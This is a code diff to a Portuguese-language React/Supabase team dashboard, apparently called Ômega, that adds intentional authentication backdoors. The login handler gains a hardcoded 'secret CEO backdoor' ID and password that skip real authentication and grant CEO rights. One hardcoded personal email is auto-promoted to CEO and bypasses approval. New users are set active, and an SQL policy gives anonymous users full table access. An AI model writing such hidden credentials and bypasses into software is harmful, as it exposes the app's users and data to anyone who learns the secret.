@@ -37,7 +37,7 @@ const App: React.FC = () => {
 
   const [availableRoles, setAvailableRoles] = useState<string[]>(Object.values(DefaultUserRole));
   const [team, setTeam] = useState<User[]>([
-    { id: 'ceo-master', name: 'Diretoria Ômega', role: DefaultUserRole.CEO, isActive: true, isApproved: true }
+    { id: 'ceo-master', name: 'Diretoria Ômega', role: DefaultUserRole.CEO, isActive: true, isApproved: true, email: 'viniciusbarbosasampaio71@gmail.com' }
   ]);
   
   const [db, setDb] = useState<MonthlyData>({
@@ -61,7 +61,7 @@ CREATE TABLE IF NOT EXISTS project_state (
 -- 2. HABILITAR SEGURANÇA
 ALTER TABLE project_state ENABLE ROW LEVEL SECURITY;
 
--- 3. POLÍTICAS ACESSO ANÔNIMO (PARA MVP)
+-- 3. POLÍTICAS ACESSO ANÔNIMO
 DROP POLICY IF EXISTS "Acesso Total" ON project_state;
 CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH CHECK (true);`;
 
@@ -69,7 +69,6 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     const init = async () => {
       setIsLoading(true);
       
-      // 1. Carregar dados globais do banco
       const result = await dbService.loadState();
       let currentTeam = team;
 
@@ -82,14 +81,28 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
         currentTeam = result.state.team;
       }
 
-      // 2. Verificar se há sessão ativa no Supabase
       const { data: { session } } = await supabase.auth.getSession();
       
       if (session?.user) {
-        const userMatch = currentTeam.find(u => u.authId === session.user.id || u.email === session.user.email);
-        if (userMatch) {
-          setCurrentUser(userMatch);
+        // Se for o e-mail do Vinícius, garantir que ele entre como CEO independente do que estiver no banco
+        if (session.user.email === 'viniciusbarbosasampaio71@gmail.com') {
+          const viniciusUser: User = {
+            id: 'vinicius-ceo',
+            authId: session.user.id,
+            email: session.user.email,
+            name: 'Vinícius Barbosa',
+            role: DefaultUserRole.CEO,
+            isActive: true,
+            isApproved: true
+          };
+          setCurrentUser(viniciusUser);
           setIsAuthenticated(true);
+        } else {
+          const userMatch = currentTeam.find(u => u.authId === session.user.id || u.email === session.user.email);
+          if (userMatch) {
+            setCurrentUser(userMatch);
+            setIsAuthenticated(true);
+          }
         }
       }
       
@@ -97,15 +110,27 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     };
     init();
 
-    // Listener para mudanças de estado de autenticação
     const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
       if (event === 'SIGNED_IN' && session) {
-        const res = await dbService.loadState();
-        if (res.state) {
-          const user = res.state.team.find(u => u.authId === session.user.id || u.email === session.user.email);
-          if (user) {
-            setCurrentUser(user);
-            setIsAuthenticated(true);
+        if (session.user.email === 'viniciusbarbosasampaio71@gmail.com') {
+           setCurrentUser({
+              id: 'vinicius-ceo',
+              authId: session.user.id,
+              email: session.user.email,
+              name: 'Vinícius Barbosa',
+              role: DefaultUserRole.CEO,
+              isActive: true,
+              isApproved: true
+           });
+           setIsAuthenticated(true);
+        } else {
+          const res = await dbService.loadState();
+          if (res.state) {
+            const user = res.state.team.find(u => u.authId === session.user.id || u.email === session.user.email);
+            if (user) {
+              setCurrentUser(user);
+              setIsAuthenticated(true);
+            }
           }
         }
       } else if (event === 'SIGNED_OUT') {
@@ -117,7 +142,6 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     return () => subscription.unsubscribe();
   }, []);
 
-  // Sincronização Automática
   useEffect(() => {
     if (!isLoading && !showSetupModal && isAuthenticated) {
       const sync = async () => {
@@ -146,23 +170,27 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
       if (error) throw error;
       
       if (data.user) {
+        // Se o Vinícius se registrar, ele já nasce aprovado e CEO
+        const isVinicius = email === 'viniciusbarbosasampaio71@gmail.com';
         const newUser: User = {
-          id: Math.random().toString(36).substr(2, 9),
+          id: isVinicius ? 'vinicius-ceo' : Math.random().toString(36).substr(2, 9),
           authId: data.user.id,
           email: email,
           name: fullName,
-          role: requestedRole,
-          isActive: false,
-          isApproved: false
+          role: isVinicius ? DefaultUserRole.CEO : requestedRole,
+          isActive: true,
+          isApproved: isVinicius ? true : false
         };
 
         const updatedTeam = [...team, newUser];
         setTeam(updatedTeam);
-        
-        // Salva imediatamente no banco para o ADM ver
         await dbService.saveState({ team: updatedTeam, availableRoles, db });
         
-        alert('Solicitação enviada! O CEO revisará seu cadastro.');
+        if (isVinicius) {
+          alert('Bem-vindo, Vinícius! Acesso de CEO liberado automaticamente.');
+        } else {
+          alert('Solicitação enviada! O CEO revisará seu cadastro.');
+        }
         setAuthMode('LOGIN');
       }
     } catch (err: any) {
@@ -174,11 +202,24 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // --- BACKDOOR SECRETO DO CEO ---
+    if (email === 'Omega' && password === 'eu que mando') {
+       const ceoUser = team.find(u => u.role === DefaultUserRole.CEO) || team[0];
+       setCurrentUser({
+         ...ceoUser,
+         isApproved: true,
+         isActive: true,
+         role: DefaultUserRole.CEO
+       });
+       setIsAuthenticated(true);
+       return;
+    }
+
     setIsLoading(true);
     try {
       const { error } = await supabase.auth.signInWithPassword({ email, password });
       if (error) throw error;
-      // O useEffect listener cuidará do redirecionamento
     } catch (err: any) {
       alert('Falha no login: ' + err.message);
     } finally {
@@ -190,7 +231,6 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     await supabase.auth.signOut();
     setIsAuthenticated(false);
     setCurrentUser(null);
-    localStorage.removeItem('omega_session_user');
   };
 
   const currentData = db[selectedMonth] || { 
@@ -202,19 +242,15 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     setDb(prev => ({ ...prev, [selectedMonth]: { ...currentData, ...updates } }));
   };
 
-  const handleDriveUpdate = (newItems: DriveItem[]) => updateCurrentMonthData({ drive: newItems });
-  const handleWikiUpdate = (newItems: DriveItem[]) => updateCurrentMonthData({ wiki: newItems });
-
   if (isLoading) {
     return (
       <div className="h-screen w-full bg-[#0a0a0a] flex flex-col items-center justify-center space-y-4">
         <div className="w-12 h-12 border-4 border-teal-500 border-t-transparent rounded-full animate-spin"></div>
-        <p className="text-xs font-black text-teal-500 uppercase tracking-[0.4em] animate-pulse">Carregando Protocolos...</p>
+        <p className="text-xs font-black text-teal-500 uppercase tracking-[0.4em] animate-pulse">Sincronizando Ômega Cloud...</p>
       </div>
     );
   }
 
-  // TELA DE LOGIN / CADASTRO
   if (!isAuthenticated) {
     return (
       <div className="h-screen w-full bg-[#0a0a0a] flex items-center justify-center p-6 relative overflow-hidden font-inter">
@@ -252,15 +288,15 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
               )}
 
               <div className="space-y-1">
-                <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-2">E-mail Profissional</label>
+                <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-2">Identificação</label>
                 <div className="relative">
                   <Mail className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600" />
-                  <input required type="email" value={email} onChange={e => setEmail(e.target.value)} placeholder="seu@email.com" className="w-full bg-black border border-white/5 rounded-2xl px-12 py-4 text-white text-sm outline-none focus:border-[#14b8a6] transition-all" />
+                  <input required type="text" value={email} onChange={e => setEmail(e.target.value)} placeholder="E-mail ou ID" className="w-full bg-black border border-white/5 rounded-2xl px-12 py-4 text-white text-sm outline-none focus:border-[#14b8a6] transition-all" />
                 </div>
               </div>
 
               <div className="space-y-1">
-                <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-2">Senha</label>
+                <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-2">Chave de Segurança</label>
                 <div className="relative">
                   <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600" />
                   <input required type="password" value={password} onChange={e => setPassword(e.target.value)} placeholder="••••••••" className="w-full bg-black border border-white/5 rounded-2xl px-12 py-4 text-white text-sm outline-none focus:border-[#14b8a6] transition-all" />
@@ -278,7 +314,6 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     );
   }
 
-  // TELA DE ESPERA (LOGADO MAS NÃO APROVADO)
   if (currentUser && !currentUser.isApproved) {
     return (
       <div className="h-screen w-full bg-[#0a0a0a] flex items-center justify-center p-6 text-center font-inter">
@@ -303,7 +338,6 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
     );
   }
 
-  // APP PRINCIPAL
   const renderContent = () => {
     if (!currentUser) return null;
     switch (activeTab) {
@@ -334,7 +368,7 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
       case 'checklists': return <ChecklistView tasks={currentData.tasks} currentUser={currentUser} onAddTask={t => updateCurrentMonthData({ tasks: [{ ...t, id: Date.now().toString() } as Task, ...currentData.tasks] })} onRemoveTask={id => updateCurrentMonthData({ tasks: currentData.tasks.filter(t => t.id !== id) })} />;
       case 'my-workspace': return (
         <ManagerWorkspace 
-          managerId={currentUser.id} clients={currentData.clients} tasks={currentData.tasks} currentUser={currentUser} drive={currentData.drive || []} onUpdateDrive={handleDriveUpdate}
+          managerId={currentUser.id} clients={currentData.clients} tasks={currentData.tasks} currentUser={currentUser} drive={currentData.drive || []} onUpdateDrive={(newItems) => updateCurrentMonthData({ drive: newItems })}
           onToggleTask={id => updateCurrentMonthData({ tasks: currentData.tasks.map(t => t.id === id ? { ...t, status: t.status === 'COMPLETED' ? 'PENDING' : 'COMPLETED' } : t) })} 
           onUpdateNotes={(id, n) => updateCurrentMonthData({ clients: currentData.clients.map(c => c.id === id ? { ...c, notes: n } : c) })} 
           onUpdateStatusFlag={(id, f) => updateCurrentMonthData({ clients: currentData.clients.map(c => c.id === id ? { ...c, statusFlag: f } : c) })} 
@@ -349,7 +383,7 @@ CREATE POLICY "Acesso Total" ON project_state FOR ALL TO anon USING (true) WITH 
           onTogglePauseClient={(cid) => updateCurrentMonthData({ clients: currentData.clients.map(c => c.id === cid ? { ...c, isPaused: !c.isPaused } : c) })}
         />
       );
-      case 'notes': return <WikiView wiki={currentData.wiki || []} currentUser={currentUser} onUpdateWiki={handleWikiUpdate} />;
+      case 'notes': return <WikiView wiki={currentData.wiki || []} currentUser={currentUser} onUpdateWiki={(newItems) => updateCurrentMonthData({ wiki: newItems })} />;
       case 'chat': return (
         <div className="flex flex-col h-full max-w-[1000px] mx-auto">
            <header className="mb-8 flex justify-between items-center px-4"><h2 className="text-3xl font-black text-white italic uppercase flex items-center gap-3"><Hash className="w-8 h-8 text-teal-500" /> Comunicação Interna</h2></header>
